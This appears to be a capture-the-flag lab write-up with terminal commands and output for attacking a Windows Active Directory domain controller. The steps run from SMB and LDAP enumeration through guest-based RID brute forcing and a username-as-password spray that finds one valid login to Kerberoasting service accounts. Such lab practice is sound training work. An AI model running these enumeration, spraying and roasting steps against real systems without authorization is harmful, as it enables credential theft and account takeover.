root@ip-10-201-83-78:~# nmap -sCV -T4 10.201.97.31 -oN initial.nmap

Host is up (0.028s latency).
Not shown: 988 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-11-09 16:21:35Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-11-09T16:23:50+00:00
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| Not valid before: 2025-06-17T21:35:42
|_Not valid after:  2025-12-17T21:35:42

enum4linux -a 10.201.103.90

had a lame output

root@ip-10-201-48-39:~# nxc smb 10.201.103.90 -u '' -p '' --shares
SMB         10.201.103.90   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.103.90   445    DC01             [-] SOUPEDECODE.LOCAL\: STATUS_ACCESS_DENIED 
SMB         10.201.103.90   445    DC01             [-] Error enumerating shares: Error occurs while reading from remote(104)

ldapsearch -x -H ldap://DC01.SOUPEDECODE.LOCAL -s base -b "" "objectclass=*"

did spit out base info

rootDomainNamingContext: DC=SOUPEDECODE,DC=LOCAL
ldapServiceName: SOUPEDECODE.LOCAL:dc01$@SOUPEDECODE.LOCAL
isGlobalCatalogReady: TRUE
supportedSASLMechanisms: GSSAPI
supportedSASLMechanisms: GSS-SPNEGO
supportedSASLMechanisms: EXTERNAL
supportedSASLMechanisms: DIGEST-MD5

ldapsearch -x -H ldap://DC01.SOUPEDECODE.LOCAL -s base -b "SOUPEDECODE" "objectclass=*"
ldapsearch -x -H ldap://DC01.SOUPEDECODE.LOCAL -s base -b "LOCAL" "objectclass=*"

but plugging in base info got us nothing because of not allowing anonymous LDAP bindings

root@ip-10-201-48-39:~# nxc smb 10.201.122.170 -u '' -p '' --shares

got nothing

root@ip-10-201-48-39:~# nxc smb 10.201.122.170 -u ' ' -p '' --shares
SMB         10.201.122.170  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.122.170  445    DC01             [+] SOUPEDECODE.LOCAL\ : (Guest)
SMB         10.201.122.170  445    DC01             [*] Enumerated shares
SMB         10.201.122.170  445    DC01             Share           Permissions     Remark
SMB         10.201.122.170  445    DC01             -----           -----------     ------
SMB         10.201.122.170  445    DC01             ADMIN$                          Remote Admin
SMB         10.201.122.170  445    DC01             backup                          
SMB         10.201.122.170  445    DC01             C$                              Default share
SMB         10.201.122.170  445    DC01             IPC$            READ            Remote IPC
SMB         10.201.122.170  445    DC01             NETLOGON                        Logon server share 
SMB         10.201.122.170  445    DC01             SYSVOL                          Logon server share 
SMB         10.201.122.170  445    DC01             Users  

root@ip-10-201-48-39:~# smbclient //10.201.112.170/IPC$
Password for [WORKGROUP\root]:
do_connect: Connection to 10.201.112.170 failed (Error NT_STATUS_HOST_UNREACHABLE)

Well IPC$ may have read perms but I can't really connect like I can with the other shares.

Oh, nevermind it appears the server crashed for the 4th time haha

root@ip-10-201-48-39:~# smbclient -L //10.201.99.60/IPC$
Password for [WORKGROUP\root]:
session setup failed: NT_STATUS_ACCESS_DENIED

reset the room again again. Without a website with a list of emails or an open SMB share with a user list or LDAP bindings permitting users or comments to be enumerated. Walkthroughs go one of two ways here. Just guessing UNs with tools like kerbrute and spamming wordlists of guesses. Using a python script to assemble username guesses with common names and symbol combinations looking for SID matches. One walkthrough  I read used a tool called lookupsid.py and this can be used as a SID brute forcing tool all in one pre made script. Just like our nxc command that grabbed we can use null UN/PW arguments

root@ip-10-201-48-39:/opt/impacket/examples# python3 lookupsid.py ' ':''@10.201.9.75 >> SIDBrute.txt
Password:
root@ip-10-201-48-39:/opt/impacket/examples# head -n 20 SIDBrute.txt 
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[*] Brute forcing SIDs at 10.201.9.75
[*] StringBinding ncacn_np:10.201.9.75[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-2986980474-46765180-2505414164
498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: SOUPEDECODE\Administrator (SidTypeUser)
501: SOUPEDECODE\Guest (SidTypeUser)
502: SOUPEDECODE\krbtgt (SidTypeUser)
512: SOUPEDECODE\Domain Admins (SidTypeGroup)
513: SOUPEDECODE\Domain Users (SidTypeGroup)
514: SOUPEDECODE\Domain Guests (SidTypeGroup)
515: SOUPEDECODE\Domain Computers (SidTypeGroup)
516: SOUPEDECODE\Domain Controllers (SidTypeGroup)
517: SOUPEDECODE\Cert Publishers (SidTypeAlias)
518: SOUPEDECODE\Schema Admins (SidTypeGroup)
519: SOUPEDECODE\Enterprise Admins (SidTypeGroup)
520: SOUPEDECODE\Group Policy Creator Owners (SidTypeGroup)
521: SOUPEDECODE\Read-only Domain Controllers (SidTypeGroup)
522: SOUPEDECODE\Cloneable Domain Controllers (SidTypeGroup)
root@ip-10-201-48-39:/opt/impacket/examples# 

AFTER RESETTING AGAIN I got the lookupsid.py to land apparently this was signaled as a possibility because of the read access on IPC$

# Exact conditions / prerequisites

1. **Network + ports**
    
    - Target reachable; SMB/RPC ports available: **445** (SMB over TCP) and/or **139**, and RPC endpoint mapper **135** may be involved.
        
    - Test: `nmap -p 135,139,445 -Pn <IP>`.
        
2. **IPC$ / named-pipe access (SMB session)**
    
    - You must be able to connect to the `\\IPC$` share (null/anonymous or with credentials) because the RPC named pipes are exposed via that session.
        
    - Test (anonymous/null):  
        `smbclient //10.0.0.1/IPC$ -U "" -N`  
        If that connects (or at least connects then denies a command), you have session-level access.
        
3. **RPC access to SAMR/LSA pipes**
    
    - The tool uses RPC calls on `\\PIPE\\samr` and/or `\\PIPE\\lsarpc`. The server must allow those RPC calls from your session.
        
    - Test: `rpcclient -U "" <IP>` then try `lookupnames` or `enumdomusers` if available; or run `enum4linux -a <host>` to see what RPC endpoints return.
        
4. **Null session vs authentication**
    
    - On older/poorly configured DCs, **anonymous (null) sessions** let you call the lookup RPCs — so you can run lookupsid with no creds. On modern/secure DCs, **you’ll need valid credentials** (domain user) to call these procedures.
        
    - If null-session is blocked, supply `-u USER -p PASS` to lookupsid.py or use a valid SMB bind.
        
5. **Domain SID or ability to discover it**
    
    - For RID brute force `lookupsid.py` needs the domain SID prefix (S-1-5-21-XXXX). You can:
        
        - Discover it from other enum tools (enum4linux, rpcclient, net, or rootDSE via LDAP if allowed), or
            
        - `lookupsid.py` may be able to query for the domain SID if RPC permissions allow.
            
    - Test: `enum4linux -a <host>` or `rpcclient -U "" <host> -c "lsaquery"` (formats vary) to get domain SID.

root@ip-10-201-48-39:/opt/impacket/examples# awk '{ split($2,a,"\\\\\\\\"); print a[2] }' SIDBrute.txt > users.txt

anyway we prune the output file to split column 2 after the backslash then print the second column. Bash makes you escape backslashes and so does awk so we end up with 4 \s just to escape one backslash delimiting how to split the array. Then print array a in column 2. Anyway, we can start password spraying from here.

root@ip-10-201-48-39:~# kerbrute passwordspray --user-as-pass -d SOUPEDECODE.LOCAL --dc 10.201.9.75 users.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 11/10/25 - Ronnie Flathers @ropnop

2025/11/10 17:09:29 >  Using KDC(s):
2025/11/10 17:09:29 >  	10.201.9.75:88

2025/11/10 17:09:29 >  [+] VALID LOGIN:	 ybob317@SOUPEDECODE.LOCAL:ybob317
2025/11/10 17:09:34 >  Done! Tested 1089 logins (1 successes) in 4.985 seconds

root@ip-10-201-48-39:~# nxc smb 10.201.9.75 -u 'ybob317' -p 'ybob317' --shares
SMB         10.201.9.75     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.9.75     445    DC01             [+] SOUPEDECODE.LOCAL\ybob317:ybob317 
SMB         10.201.9.75     445    DC01             [*] Enumerated shares
SMB         10.201.9.75     445    DC01             Share           Permissions     Remark
SMB         10.201.9.75     445    DC01             -----           -----------     ------
SMB         10.201.9.75     445    DC01             ADMIN$                          Remote Admin
SMB         10.201.9.75     445    DC01             backup                          
SMB         10.201.9.75     445    DC01             C$                              Default share
SMB         10.201.9.75     445    DC01             IPC$            READ            Remote IPC
SMB         10.201.9.75     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.201.9.75     445    DC01             SYSVOL          READ            Logon server share 
SMB         10.201.9.75     445    DC01             Users           READ     

it appears we now have greater read access to other shares particularly Users share, however that juicy backup share that is looking me in the eye has not turned  its pretty head. 

root@ip-10-201-48-39:~# smbclient //10.201.9.75/Users -U ybob317
Password for [WORKGROUP\ybob317]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                  DR        0  Thu Jul  4 23:48:22 2024
  ..                                DHS        0  Mon Nov 10 16:40:06 2025
  admin                               D        0  Thu Jul  4 23:49:01 2024
  Administrator                       D        0  Mon Nov 10 16:49:32 2025
  All Users                       DHSrn        0  Sat May  8 09:26:16 2021
  Default                           DHR        0  Sun Jun 16 03:51:08 2024
  Default User                    DHSrn        0  Sat May  8 09:26:16 2021
  desktop.ini                       AHS      174  Sat May  8 09:14:03 2021
  Public                             DR        0  Sat Jun 15 18:54:32 2024
  ybob317                             D        0  Mon Jun 17 18:24:32 2024

cant get into admin or Administrator directories desktop.ini reads as follows

\ufffd\ufffd
[.ShellClassInfo]
LocalizedResourceName=@%SystemRoot%\system32\shell32.dll,-21813

ntuser.ini in the ytbob317 reads as \ufffd\ufffd



root@ip-10-201-48-39:~# GetNPUsers.py SOUPEDECODE.LOCAL/ -dc-ip 10.201.9.75 -usersfile users.txt -format hashcat -outputfile hashes.txt

root@ip-10-201-48-39:~# cat hashes.txt
<blank>

Checking if any accounts are ASREP roastable, it appears none are. Moving on to normal kerberoasting.

root@ip-10-201-48-39:~# GetUserSPNs.py SOUPEDECODE.LOCAL/ytbob317:ytbob317 -dc-ip 10.201.9.75 -request 
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

[-] Error in searchRequest -> operationsError: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v4f7c
root@ip-10-201-48-39:~# rpcclient -U "SOUPEDECODE\\ytbob317%ytbob317" 10.201.9.75 -c 'srvinfo'
Bad SMB2 (sign_algo_id=2) signature for message
[0000] 00 00 00 00 00 00 00 00   00 00 00 00 00 00 00 00   ........ ........
[0000] AB 85 64 55 99 04 E2 0A   5F 21 5D 81 9C 23 44 28   ..dU.... _!]..#D(
Cannot connect to server.  Error was NT_STATUS_ACCESS_DENIED

got stuck here, because holy typo

root@ip-10-201-48-39:~# GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.9.75 -request -outputfile hashes.txt
Impacket v0.10.1.dev1+20230316.112532.f0ac44bd - Copyright 2022 Fortra

ServicePrincipalName    Name            MemberOf  PasswordLastSet             LastLogon  Delegation 
----------------------  --------------  --------  --------------------------  ---------  ----------
FTP/FileServer          file_svc                  2024-06-17 18:32:23.726085  <never>               
FW/ProxyServer          firewall_svc              2024-06-17 18:28:32.710125  <never>               
HTTP/BackupServer       backup_svc                2024-06-17 18:28:49.476511  <never>               
HTTP/WebServer          web_svc                   2024-06-17 18:29:04.569417  <never>               
HTTPS/MonitoringServer  monitoring_svc            2024-06-17 18:29:18.511871  <never>               



[-] CCache file is not found. Skipping...

this should give us hashes to these services listed above